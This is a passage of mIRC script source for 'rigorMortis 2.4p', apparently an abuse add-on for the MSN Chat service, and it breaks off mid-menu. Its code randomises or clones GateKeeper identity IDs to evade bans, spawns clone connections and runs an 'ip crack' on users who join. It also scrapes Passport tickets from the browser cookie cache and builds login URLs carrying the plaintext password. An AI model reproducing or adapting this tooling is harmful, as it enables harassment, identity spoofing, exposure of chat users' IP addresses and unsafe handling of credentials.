;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;
;;;;             
;;;; rigorMortis 
;;;;     2.4p    ;;;;
;;;;     sid     ;;;;
;;;;             ;;;;
;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;

;;;; Hot keys 

; F1 - kick last person joining
; F2 - ban last person joining
; F3 - banlist last person joining
; F4 - ip crack last person joining
; F5 - halt ip crack in active channel
; F6 - remove last person joining from banlist
; F7 - halt all user lists in active channel
; F8 - resume all user lists back to original settings
; F9 - list all 3 channel pages for CP

;;;; main commands

; /msn
; /join
; /nick

;;;; Connection

alias key {
  var %i, %r, %c, %str
  %i = 1
  %r = $r( 12, 30 )
  while ( %i <= %r ) {
    %c = $toEscNum( 10, $r( 60, 255 ))
    %str = $+( %str, %c )
    if ( $len(%c) == 2 ) { dec %r }
    inc %i
  }   
  return $+( :, %str )
}

alias hexString { return $+( $hexVal, $hexVal, $hexVal, $hexVal, $hexVal, $hexVal, $hexVal, $hexVal ) }

alias getKey { return $readini( c:\rigorMortis\main.ini, $$1, $$2 ) }

alias getSock { return $sGet( $$1 ) }

alias -l nhtmln { return dll $shortfn($scriptdir $+ nhtmln_2.92.dll) }
alias -l nhtmln.init { window -h $+( @, $$1 ) | $nhtmln attach $window($+( @, $$1 )).hwnd }
alias -l nhtmln.nav { $nhtmln select $window($+( @, $$1 )).hwnd | $nhtmln navigate $$2 | if ( $3 ) { titlebar $+( @, $$1 ) $ifmatch } }
alias -l sSet { hadd rigorMortis $$1 $$2- }
alias -l sGet { return $hget( rigorMortis, $$1 ) }
alias -l sInc { hinc rigorMortis $$1 }
alias -l sDec { hdec rigorMortis $$1 }
alias -l setSock { $sSet( $$1, $$2 ) }
alias -l delSock { hdel rigorMortis $$1 }
alias -l setKey { writeini c:\rigorMortis\main.ini $$1 $$2 $$3- }
alias -l getPassport { return $readini( passports.ini, $1, passport ) }
alias -l pmode { $+( .timer, $hexString ) 1 3 pmodedo $mid( $1, 3 ) $$2 }
alias -l pmodedo { 
  var %c, %m
  %c = $$1
  %c = $+( $chr(37), $chr(35), %c )
  %m = $$2-
  $clientQue(MODE %c %m)
}
alias -l setBotSock { $sSet( botSock. [ $+ [ $$1 ] ], $$2 ) }
alias -l getBotSock { return $sGet( botSock. [ $+ [ $1 ] ] ) }
alias -l getBotGate { return $sGet( botGate. [ $+ [ $1 ] ] ) }
alias -l setBotGate { $sSet( botGate. [ $+ [ $$1 ] ], $$2 ) }
alias -l setBotNick { $sSet( botNick. [ $+ [ $$1 ] ], $$2 ) }
alias -l getBotNick { return $sGet( botNick. [ $+ [ $1 ] ] ) }
alias -l randBotNick { return $left( $+( >, $hexString, $hexString, $hexString, $hexString, $hexString ), 71 ) }
alias -l getSockAuthString { return $getAuthString($getSockPp) }
alias -l getSockSub { return $getSub($getSockPp) }
alias -l getSockPp { return $+( $chr(37), $readini( passport.ini, settings, sockPp ) ) }
alias -l setSockPp { writeini -n passport.ini settings sockPp $$1 }
alias -l getSockGkp { return $readini( passport.ini, $mid( $getSockPp, 2 ), Gkp ) }
alias -l subSockPp {   
  if ( $1 == begin || $1 == end || $ini( passport.ini, $1 ) == settings || $ini( passport.ini, $1 ) == $mid( $getCurPp, 2 ) ) { return - }
  elseif ( $ini( passport.ini, $1 ) ) { return $+( $hexToAscii($ifmatch), $chr(9), - $getGkp( $+( $chr(37), $ini( passport.ini, $1 ) )) ) : $!setSockPp($ini( passport.ini, $1 )) }
}
alias -l getCurAuthString { return $getAuthString($getCurPp) }
alias -l getCurSub { return $getSub($getCurPp) }
alias -l getCurPp { return $+( $chr(37), $readini( passport.ini, settings, curPp ) ) }
alias -l setCurPp { writeini passport.ini settings curPp $$1 }
alias -l getGkp { return $readini( passport.ini, $mid( $$1, 2 ), Gkp ) }
alias -l setGkp { writeini -n passport.ini $mid( $$1, 2 ) Gkp $$2 }
alias -l findSub {
  var %i, %t, %f, %fn, %s
  %i = 1
  %t = $getFindTicket
  %f = $getCookiesPath
  while ( %i <= $findfile( %f, renderchat[?]*, 0 ) ) {
    %fn = $findfile( %f, renderchat[?]*, %i )
    if ( $gettok( $read( %fn, w, *"PassportTicket" VALUE="5* ), 17, 34 ) == %t ) {
      %s = $read( %fn, w, *"SubscriberInfo" VALUE="5* ) 
      if ( !%s ) { return 0 }
      return $$gettok( %s, 4, 34 )
    }
    inc %i
  }
  return 0
}
alias -l setCookiesPath { 
  var %c
  .comopen register wScript.shell
  %c = $com( register, regread, 1, string, HKLM\software\microsoft\windows\currentversion\internet settings\cache\paths\\directory )
  writeini -n passport.ini settings cookiesPath $shortfn($$com(register).result)
  .comclose register
}
alias -l setSubscribed { writeini -n passport.ini $mid( $$getUpdatePassport, 2 ) subScribed $1 }
alias -l getSubscribed { return $readini( passport.ini, $mid( $$1, 2 ), subScribed ) }
alias -l setAuthString { writeini -n passport.ini $mid( $$getUpdatePassport, 2 ) authString $+( 0000005A, $$1, 000000, $hex($len($$2)), $$2 ) }
alias -l getAuthString { return $readini( passport.ini, $mid( $$1, 2 ), authString ) }
alias -l setLastUpdate { writeini -n passport.ini $mid( $$getUpdatePassport, 2 ) lastUpdate $$1 }
alias -l getLastUpdate { return $readini( passport.ini, $mid( $$1, 2 ), lastUpdate ) }
alias -l setFindTicket { $sSet( findTicket, $$1- ) }
alias -l getFindTicket { return $sGet(findTicket) }
alias -l setSub { writeini -n passport.ini $mid( $$getUpdatePassport, 2 ) sub $$1- }
alias -l getSub { return $readini( passport.ini, $mid( $$1, 2 ), sub ) }
alias -l setUpdatePassport { $sSet( updatePassport, $mid( $$1, 2 ) ) }
alias -l getUpdatePassport { return $+( $chr(37), $sGet(updatePassport) ) }
alias -l setNavPage { $sSet( navPage, $$1- ) }
alias -l getNavPage { return $sGet(navPage) }
alias -l setPpTicks { $sSet( ppTicks, $$1- ) }
alias -l getPpTicks { return $sGet(ppTicks) }
alias -l setSubTicks { $sSet( subTicks, $$1- ) }
alias -l getSubTicks { return $sGet(subTicks) }
alias -l chatLogin {
  var %pp = $$1
  var %pw = $$2
  var %li = $+( https://login.passport.com/ppsecure/post.srf?id=2260&ru=http://chat.msn.com/FearTheSheep&login=, %pp, &passwd=, %pw )
  return %li
}
alias -l cookiesLogin { return http://login.passport.com/login.srf? }
alias -l getLogin { return $iif( $window(@rigorMortis.update), $getNavPage, $cookiesLogin ) }
alias -l msn.net { return 207.68.167. }
alias -l msn.host { return $iif( $1 == ns, $iif( $2 == 0, WBA, $+( TK2CHATCHATA0, $2 ) ), $iif( $2 == 0, 253, $calc( 156 + $2 ) ) ) }
alias -l hexVal {  
  var %r
  %r = $r( 1, 255 )
  %r = $base( %r, 10, 16 )
  %r = $iif( $len(%r) == 1, $+( 0, %r ), %r )
  return %r
}
alias -l hex { return $base( $$1, 10, 16 ) }
alias -l den { return $base( $$1, 16, 10 ) }
alias -l guest {
  var %i, %o, %int, %c
  %i = $1-
  %i = $right( %i, 32 )
  %i = $+( $str( 0, $calc( 32 - $len( %i ) ) ), %i )
  %i = $+( $mid( %i, 7, 2 ), $mid( %i, 5, 2 ), $mid( %i, 3, 2 ), $mid( %i, 1, 2 ), $mid( %i, 11, 2 ), $mid( %i, 9, 2 ), $mid( %i, 15, 2 ), $mid( %i, 13, 2 ), $mid( %i, 17 ) )
  %i = $iif( %i == $str( 0, 32 ), $+( $str( 0, 31 ), 1 ), %i ) 
  %int = 1
  while ( %int <= $len(%i) ) { 
    %c = $mid( %i, %int, 2 ) 
    %o = $+( %o, $toEscNum( , $mid( %i, %int, 2 ) ) )
    inc %int 2
  }
  return %o
}
alias -l fromEscNum {
  var %in
  %in = $$1
  if ( %in == \0 ) { return 0 }
  elseif ( %in == \t ) { return 9 }
  elseif ( %in == \n ) { return 10 }
  elseif ( %in == \r ) { return 13 }
  elseif ( %in == \b ) { return 32 }
  elseif ( %in == \c ) { return 44 }
  elseif ( %in == \\ ) { return 92 }
  else { return $asc(%in) }
}
alias -l toEscNum {
  var %in 
  %in = $$2 
  %in = $iif( $1, $base( %in, $1, 10 ), $base( %in, 16, 10 ) )
  if ( %in == 0 ) { return \0 }
  elseif  ( %in == 9 ) { return \t }
  elseif ( %in == 10 ) { return \n }
  elseif ( %in == 13 ) { return \r }
  elseif ( %in == 32 ) { return \b }
  elseif ( %in == 44 ) { return \c }
  elseif ( %in == 92 ) { return \\ }
  else { return $chr(%in) }
}
alias -l asciiToHex {
  var %i, %in, %c, %o
  %i = 1
  %in = $$2 
  while ( %i <= $len(%in) ) {
    %c = $base( $asc($mid( %in, %i, 1 )), 10, 16 )
    %c = $iif( $1 == s, $+( $chr(37), %c ), %c )
    %o = $+( %o, %c ) 
    inc %i
  }
  return %o
}
alias -l hexToAscii {
  var %i, %in, %c, %o
  %i = 1
  %in = $$1  
  %in = $remove( $$1, $chr(37) )
  while ( %i <= $len(%in) ) {
    %c = $chr($base( $mid( %in, %i, 2 ), 16, 10 ))
    %o = $+( %o, %c )
    inc %i 2
  }
  return %o
}
alias -l getGateKeeperNick1 { return $readini( address.ini, $$1, nick1 ) }
alias -l getGateKeeperNick2 { return $readini( address.ini, $$1, nick2 ) }
alias -l getGateKeeperNick3 { return $readini( address.ini, $$1, nick3 ) }
alias -l getGateKeeperNicks {
  var %n, %g
  %n = $$1
  %g = $ial(%n).addr
  if ( $getGateKeeperNick3(%g) ) { return $+( $chr(3), %n, 's last 3 nicks, $chr(3), 2 ', $chr(3), 5, $getGateKeeperNick1(%g), $chr(3), 2, $chr(44), $chr(3), 5, $chr(32), $getGateKeeperNick2(%g), $chr(3), 2, $chr(44), $chr(3), 5, $chr(32), $ifmatch, $chr(3), 2' ) }
  elseif ( $getGateKeeperNick2(%g) ) { return $+( $chr(3), %n, 's last 2 nicks, $chr(3), 2 ', $chr(3), 5, $getGateKeeperNick1(%g), $chr(3), 2, $chr(44), $chr(3), 5, $chr(32), $ifmatch, $chr(3), 2' ) }
  elseif ( $getGateKeeperNick1(%g) ) { return $+( $chr(3), %n, 's last nick, $chr(3), 2 ', $chr(3), 5, $ifmatch, $chr(3), 2' ) }
  else { return 0 }
}
alias -l setGatekeeperNicks {
  var %n, %g, %n1, %n2, %n3
  %n = $$1
  %g = $iif( $2, $2, $ial(%n).addr )
  %n1 = $readini( address.ini, %g, nick1 )
  %n2 = $readini( address.ini, %g, nick2 )
  %n3 = $readini( address.ini, %g, nick3 )
  if ( %n != %n1 ) {
    writeini -n address.ini %g nick1 %n
    if ( %n1 ) { writeini -n address.ini %g nick2 %n1 }
    if ( %n2 ) { writeini -n address.ini %g nick3 %n2 }
  }
}
alias -l getGateKeeperType { return $getKey( settings, gateKeeperType ) }
alias -l setGateKeeperType { $setKey( settings, gateKeeperType, $$1 ) }
alias -l setGateKeeperClone { $setKey( settings, gateKeeperClone, $$1 ) }
alias -l getGateKeeperClone { return $getKey( settings, gateKeeperClone ) }
alias -l userGateKeeper { return $iif( $asciiToHex( , $gettok( $1, 1, 64 ) ) == $+( 463, 8, 43393, 646, 42, 343, 038, 3934, 363837, 3, 2 ), 1, 0 ) }
alias -l getGateKeeper {
  var %t
  %t = $iif( $1, $1, $getGateKeeperType ) 
  if ( %t == hex ) { return $+( $hexString, $hexString ) }
  elseif ( %t == WEBTV ) { return $+( $hexVal, $hexVal, $hexVal, $hexVal, D21DB211, $hexVal, $hexVal, $hexVal, $hexVal, $hexVal, $hexVal, $hexVal, $hexVal ) }
  elseif ( %t == binary ) { return $+( $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ), $r( 0, 1 ) ) }
  elseif ( %t == denary ) { return $+( $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ), $r( 0, 9 ) ) }
  elseif ( %t == octal ) { return $+( $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ), $r( 0, 7 ) ) }
  elseif ( %t == clone ) { return $$getGateKeeperClone }
  elseif ( !%t ) || ( %t == normal ) { return $+( $hexVal, $hexVal, $str( 0, 23 ), 31337 ) }
}
alias -l sockMrc { return $replace( $mrc, Mortis, Bot ) }
alias -l addReconnectQue { hadd -m reconQue $hexString $$1 $$2 $$3 $4 $5 }
alias -l delReconnectQue { if ( $hget( reconQue, 0 ).item ) { .hfree reconQue } }
alias -l setBotCloneStatus { $sSet( botCloneStatus, $1 ) }
alias -l getBotCloneStatus { return $sGet(botCloneStatus) }
alias -l getBotCloneOld { return $sGet(getBotCloneOld) }
alias -l setBotCloneOld { $sSet( getBotCloneOld, $1 ) }
alias -l clientQue { privmsg mIRC $$1- }
alias -l setMotd { $sSet( motd, $$1 ) }
alias -l getMotd { return $sGet(motd) }
alias -l roomList {
  var %c, %p, %s
  %c = $iif( $1, $1, CP )
  %p = $iif( $2, $2, 1 )
  %s = $hexString
  %s = $+( roomList., %s )
  sockopen %s chat.msn.com 80
  sockmark %s %c %p
}
alias f1 {
  var %c, %f, %n, %g
  %c = $active
  %f = $iif( %joinflood. [ $+ [ %c ] ], %joinflood. [ $+ [ %c ] ], 1 )
  %n = $sGet( nickjoin. [ $+ [ %c ] ] [ $+ [ . ] ] [ $+ [ %f ] ] )  
  %g = $gettok( %n, 2, 32 )
  %n = $gettok( %n, 1, 32 )
  sockwrite -n $getSock(%c) KICK %c %n
}
alias f2 {
  var %c, %f, %n, %g
  %c = $active
  %f = $iif( %joinflood. [ $+ [ %c ] ], %joinflood. [ $+ [ %c ] ], 1 )
  %n = $sGet( nickjoin. [ $+ [ %c ] ] [ $+ [ . ] ] [ $+ [ %f ] ] )  
  %g = $gettok( %n, 2, 32 )
  %n = $gettok( %n, 1, 32 )
  sockwrite -n $getSock(%c) $+( ACCESS %c add deny *!, %g 0 :, $mrc $vers - ban %n, $crlf, KICK %c %n, $crlf, PROP %c ownerkey $key )
}
alias f3 {
  var %c, %f, %n, %g
  %c = $active
  %f = $iif( %joinflood. [ $+ [ %c ] ], %joinflood. [ $+ [ %c ] ], 1 )
  %n = $sGet( nickjoin. [ $+ [ %c ] ] [ $+ [ . ] ] [ $+ [ %f ] ] )  
  %g = $gettok( %n, 2, 32 )
  %n = $gettok( %n, 1, 32 )
  writeini -n banlist.ini %g nick %n
  writeini -n banlist.ini %g reason Quick add
  sockwrite -n $getSock(%c) $+( ACCESS %c add deny *!, %g 0 :, $mrc $vers - ban %n, $crlf, KICK %c %n :, $chr(3), 5Banlist, $chr(3), 2 %n ', $chr(3), 5Quick add, $chr(3), 2', $crlf, PROP %c ownerkey $key )
}
alias f4 { 
  var %c, %f, %n, %g
  %c = $active
  %f = $iif( %joinflood. [ $+ [ %c ] ], %joinflood. [ $+ [ %c ] ], 1 )
  %n = $sGet( nickjoin. [ $+ [ %c ] ] [ $+ [ . ] ] [ $+ [ %f ] ] )  
  %g = $gettok( %n, 2, 32 )
  %n = $gettok( %n, 1, 32 )
  $ipcrack( %n, %c, 2 )
}
alias f5 { 
  var %c, %h %g
  %c = $active
  %h = ip. [ $+ [ %c ] ]
  %g = $$hget( %h, gkp )
  sockwrite -n $getSock(%c) $+( ACCESS %c clear voice, $crlf, ACCESS %c clear host, $crlf, ACCESS %c clear owner, $crlf, PROP %c ownerkey $key )
  $print( 5, %c, Current ip - $$hget( %h, ip ) )
  writeini -n ip.ini %g ip $$hget( %h, ip )
  writeini -n ip.ini %g time $ctime 
  .hfree %h
}
alias f6 { 
  var %c, %f, %n, %g
  %c = $active
  %f = $iif( %joinflood. [ $+ [ %c ] ], %joinflood. [ $+ [ %c ] ], 1 )
  %n = $sGet( nickjoin. [ $+ [ %c ] ] [ $+ [ . ] ] [ $+ [ %f ] ] )  
  %g = $gettok( %n, 2, 32 )
  %n = $gettok( %n, 1, 32 )
  remini -n banlist.ini %g
  sockwrite -n $$getSock(%c) $+( ACCESS %c delete deny *!, %g, $chr(36), * )
}
alias f7 { $userHalt($active) }
alias f8 { 
  $userRestore($active) 
  $userScan($active)
}
alias f9 {
  $roomList( CP, 1 )
  $roomList( CP, 2 )
  $roomList( CP, 3 )
}
alias -l userHalt {
  var %c
  %c = $1
  $sSet( gAop. [ $+ [ %c ] ], $popup.check( gAop, %c ) )
  $sSet( lAop. [ $+ [ %c ] ], $popup.check( lAop, %c ) )
  $sSet( gAhost. [ $+ [ %c ] ], $popup.check( gAhost, %c ) )
  $sSet( lAhost. [ $+ [ %c ] ], $popup.check( lAhost, %c ) )
  $sSet( gAvoice. [ $+ [ %c ] ], $popup.check( gAvoice, %c ) )
  $sSet( lAvoice. [ $+ [ %c ] ], $popup.check( lAvoice, %c ) )
  %gAop. [ $+ [ %c ] ] = off
  %lAop. [ $+ [ %c ] ] = off
  %gAhost. [ $+ [ %c ] ] = off
  %lAhost. [ $+ [ %c ] ] = off
  %gAvoice. [ $+ [ %c ] ] = off
  %lAvoice. [ $+ [ %c ] ] = off
  $print( 5, %c, Users halted for channel )
}
alias -l userRestore {
  var %c
  %c = $1
  %gAop. [ $+ [ %c ] ] = $sGet( gAop. [ $+ [ %c ] ] )
  %lAop. [ $+ [ %c ] ] = $sGet( lAop. [ $+ [ %c ] ] )
  %gAhost. [ $+ [ %c ] ] = $sGet( gAhost. [ $+ [ %c ] ] )
  %lAhost. [ $+ [ %c ] ] = $sGet( lAhost. [ $+ [ %c ] ] )
  %gAvoice. [ $+ [ %c ] ] = $sGet( gAvoice. [ $+ [ %c ] ] )
  %lAvoice. [ $+ [ %c ] ] = $sGet( lAvoice. [ $+ [ %c ] ] )
  $print( 5, %c, Users restored for channel )
}
alias -l subPp {   
  if ( $1 == begin || $1 == end || $ini( passport.ini, $1 ) == settings ) { return - }
  elseif ( $ini( passport.ini, $1 ) ) { return $+( $hexToAscii($ifmatch), $chr(9), - $getGkp( $+( $chr(37), $ini( passport.ini, $1 ) )) ) : $!setCurPp($ini( passport.ini, $1 )) }
}


alias -l getCookiesPath { return $readini( passport.ini, settings, cookiesPath ) }

alias -l update {
  if ( !$1 || !$2 ) { 
    $print( 5, -st, Incorrect paramaters: /update )
    return
  }
  var %pp, %pw, %li  
  %pp = $+( $chr(37), $1 )
  %pw = $+( $chr(37), $2 )
  $setUpdatePassport(%pp)
  $print( 2, -st, Updating passport - $hexToAscii(%pp) )
  $setNavPage($chatLogin( %pp, %pw ))
  %li = $getLogin
  $nhtmln.init(rigorMortis.update)
  $nhtmln.nav( rigorMortis.update, %li )
  $nhtmln handler updateHandle
  $setPpTicks($ticks)
  if ( !$getCookiesPath ) { $setCookiesPath }
}

alias updateHandle {
  if ( *cookiesdisabled* iswm $2- ) { $nhtmln.nav( rigorMortis.update, $cookiesLogin ) }
  elseif ( navigate_begin http://login.passport.net/uilogin.srf == $2-3 ) { $nhtmln.nav( rigorMortis.update, $getNavPage ) }
  elseif ( *navigate_begin http://chat.msn.com/FearTheSheep?did=1* iswm $2-3 ) { 
    $print( 5, -st, $+( Updated authString - $hexToAscii($getUpdatePassport) $chr(3), 2', $calc( ($ticks - $getPpTicks) / 1000 ) s' ) )
    $setLastUpdate($ctime)
    var %pt, %pp
    %pt = $mid( $wildtok( $3, t=5*, 1, 38), 3 )
    %pp = $mid( $wildtok( $3, p=5*, 1, 38), 3 )
    $setAuthString( %pt, %pp )
    $nhtmln.nav( rigorMortis.update, $+( http://chat.msn.com/renderchat.msnw?did=1&t=, %pt, &p=, %pp ) )
    $setSubTicks($ticks)
    $setFindTicket(%pt)
  }
  elseif ( document_complete http://chat.msn.com/renderchat.msnw? == $2-3 ) { 
    $nhtmln.nav( rigorMortis.update, view-source:http://chat.msn.com/renderchat.msnw? ) 
    $setNavPage( progress_change 0 of 0 )
  }
  elseif ( $getNavPage == $2-5 ) { 
    $nhtmln.nav( rigorMortis.update, http://login.passport.com/logout.srf? ) 
    $setNavPage(sid)
  }
  elseif ( navigate_begin http://login.passport.net/uilogout.srf == $2-3 ) {
    if ( $findsub ) { 
      $setSub($ifmatch)
      $setSubscribed(1)
      $print( 5, -st, $+( Updated subscription info - $hexToAscii($getUpdatePassport) $chr(3), 2', $calc( ($ticks - $getSubTicks) / 1000 ) s' ) )
    }
    else {
      $setSubscribed(0)
      $print( 5, -st, $+( No subscription info - $hexToAscii($getUpdatePassport) $chr(3), 2', $calc( ($ticks - $getSubTicks) / 1000 ) s' ) )
    }
    editbox -sf
    if ( !$getGkp($getUpdatePassport) ) { $conGkp($getUpdatePassport) }
    var %i, %c, %id, %ip, %sk, %n
    %i = 1 
    while ( %i <= $hget( reconQue, 0 ).item ) {
      %c = $hget( reconQue, %i ).data
      tokenize 32 %c
      %id = $$1 
      %ip = $$2
      %sk = $$3  
      %n = $4
      if ( $5 ) { 
        var %id, %ip, %c, %sk
        %id = $hexString
        %c = $5
        %ip = $$sock($$getSock(%c)).ip
        $ocx.init( %id, %ip, bot )
        %sk = $+( bot., %id )
        sockopen %sk %ip 6667
        sockmark %sk %c 
        $setBotSock( %c, %sk )
        $setBotNick( %sk, %n )
      }
      else { $connect( %id, %ip, %sk, %n ) }
      inc %i
    }
    $delReconnectQue
    return S_CANCEL
  }
  elseif ( navigate_complete http://groups.msn.com/Editorial/en-gb/Content/chat.htm == $2-3 ) {
    $print( 5, -st, Your computer is currently set to UK settings $chr(44) please change it to US in regional settings and reupdate )
  }
  return S_OK
}
alias clone {
  if ( $calc( $ctime - $getLastUpdate($getCurPp) ) >= 7200 ) {
    $print( 5, -a, Updating passport before changing nickname )
    $update( $mid( $getCurPp, 2 ), $readini( passport.ini, $mid( $getCurPp, 2 ), password ) )
    return
  }
  var %i, %id, %s, %c, %sk, %ip
  %i = 1
  while ( %i <= $sock( rigorMortis.????????????????, 0 ) ) { 
    %id = $hexString
    %s = $sock( rigorMortis.????????????????, %i )
    %ip = $sock(%s).ip
    %c = $sock(%s).mark
    %sk = $+( clone., %id )
    $ocx.init( %id, %ip, clone )
    sockopen %sk %ip 6667
    sockmark %sk $$1 %c
    inc %i
  }
  $sSet( clonemax, $calc( %i - 1 ) )
  $sSet( clonecon, 0 )
}
alias -l motd {
  var %s
  %s = $+( MOTD., $hexString )
  sockopen %s chickenx.com 80
  sockmark %s /FearTheSheep/MOTD.hEX
}

on *:sockopen:MOTD.????????????????:{ 
  if ( !$sockerr ) { sockwrite -n $sockname $+( GET $sock($sockname).mark HTTP/1.1, $crlf, HOST: chickenx.com, $crlf, $crlf ) } 
}

on *:sockread:MOTD.????????????????:{
  var %r, %rw
  sockread %r
  while ( $sockbr ) {
    %rw = $left( %r, 4 )
    if ( %rw == MOTD ) { 
      $setMotd($right( %r, -5 )) 
      $print( 5, -se, MOTD for $gettok( $getMotd(), 1, 32 ) - $gettok( $getMotd, 2-, 32 ) ) 
      sockclose $sockname
    }
    if ( $sockname ) { sockread %r }
  }
}

alias -l getUserStatus {
  var %g
  %g = $ial($1).addr
  if ( $readini( aop.ini, global, %g ) ) { return Global.q }
  elseif ( $readini( aop.ini, $mid( #, 2 ), %g ) ) { return Local.q }
  elseif ( $readini( ahost.ini, global, %g ) ) { return Global.o }
  elseif ( $readini( ahost.ini, $mid( #, 2 ), %g ) ) { return Local.o }
  elseif ( $readini( avoice.ini, global, %g ) ) { return Global.v }
  elseif ( $readini( avoice.ini, $mid( #, 2 ), %g ) ) { return Local.v }
  else { return none }
}

menu nicklist { 
  $iif( $server == rigorMortis && $getGateKeeperNick1($ial($1).addr), $+( $style(2), Nick1, $chr(9), - $getGateKeeperNick1($ial($1).addr) ) ) : null
  $iif( $server == rigorMortis && $getGateKeeperNick2($ial($1).addr), $+( $style(2), Nick2, $chr(9), - $getGateKeeperNick2($ial($1).addr) ) ) : null
  $iif( $server == rigorMortis && $getGateKeeperNick3($ial($1).addr), $+( $style(2), Nick3, $chr(9), - $getGateKeeperNick3($ial($1).addr) ) ) : null
  $iif( $server == rigorMortis, $+( $style(2), User status, $chr(9), - $getUserStatus($1) ) ) : null
  $iif( $server == rigorMortis, - )
  $iif( $server == rigorMortis, Nick commands )
  .Owner : sockwrite -n $getSock(#) MODE # $+( +, $str( q, $numtok( $snicks, 44 ) ) ) $replace( $snicks, $chr(44), $chr(32) )
  .Deowner {
    var %i, %bn, %n, %s
    %i = 1
    %bn = $getBotNick($getBotSock(#))
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $gettok( $snicks, %i, 44 )
      if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(32), %n ) }
      inc %i
    } 
    sockwrite -n $getSock(#) $+( PROP # ownerkey :$NULL, $crlf, ACCESS # clear owner, $crlf, MODE # -, $str( q, $numtok( %s, 32 ) ) %s, $crlf, PROP # ownerkey $hexString, $crlf, ACCESS # clear owner, $crlf, PROP # hostkey $hexString, $crlf, ACCESS # clear host, $crlf, ACCESS # add owner *!, %gate 0 :, $mrc $vers )
  }
  .Op : sockwrite -n $getSock(#) MODE # $+( +, $str( o, $numtok( $snicks, 44 ) ) ) $replace( $snicks, $chr(44), $chr(32) )
  .Deop {
    var %i, %bn, %n, %s
    %i = 1
    %bn = $getBotNick($getBotSock(#))
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $gettok( $snicks, %i, 44 )
      if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(32), %n ) }
      inc %i
    } 
    sockwrite -n $getSock(#) $+( PROP # ownerkey :$NULL, $crlf, ACCESS # clear owner, $crlf, MODE # -, $str( o, $numtok( %s, 32 ) ) %s, $crlf, PROP # ownerkey $hexString, $crlf, ACCESS # clear owner, $crlf, PROP # hostkey $hexString, $crlf, ACCESS # clear host, $crlf, ACCESS # add owner *!, %gate 0 :, $mrc $vers )
  }
  .Voice : sockwrite -n $getSock(#) MODE # $+( +, $str( v, $numtok( $snicks, 44 ) ) ) $replace( $snicks, $chr(44), $chr(32) )
  .Devoice : sockwrite -n $getSock(#) MODE # $+( -, $str( v, $numtok( $snicks, 44 ) ) ) $replace( $snicks, $chr(44), $chr(32) )
  .Kick {
    var %i, %bn, %n, %s
    %i = 1
    %bn = $getBotNick($getBotSock(#))
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $gettok( $snicks, %i, 44 )
      if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(44), %n ) }
      inc %i
    } 
    sockwrite -n $getSock(#) $+( PROP # ownerkey :$NULL, $crlf, ACCESS # clear owner, $crlf, KICK # %s, $crlf, PROP # ownerkey $hexString, $crlf, ACCESS # clear owner, $crlf, PROP # hostkey $hexString, $crlf, ACCESS # clear host, $crlf, ACCESS # add owner *!, %gate 0 :, $mrc $vers )
  }
  .Ban {
    var %i, %bn, %n
    %i = 1
    %bn = $getBotNick($getBotSock(#))
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $gettok( $snicks, %i, 44 )
      if ( %n != $me ) && ( %n != %bn ) { 
        $clientQue( ACCESS # clear owner )
        $clientQue( ACCESS # add deny $+( *!, $ial( %n ).addr ) )
        $clientQue( KICK # %n ) 
        $clientQue( PROP # ownerkey $key )
      }
      inc %i
    } 
  }
  $iif( $server == rigorMortis, Chan commands )
  .Owner {
    var %i, %c
    %i = 1
    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) MODE %c +q $$1
      inc %i
    }
  }
  .Deowner {
    var %i, %c
    %i = 1
    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, MODE %c -qo $$1 $$1, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
      inc %i
    }
  }
  .Op {
    var %i, %c
    %i = 1
    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) MODE %c +o $$1
      inc %i
    }
  }
  .Deop {
    var %i, %c
    %i = 1
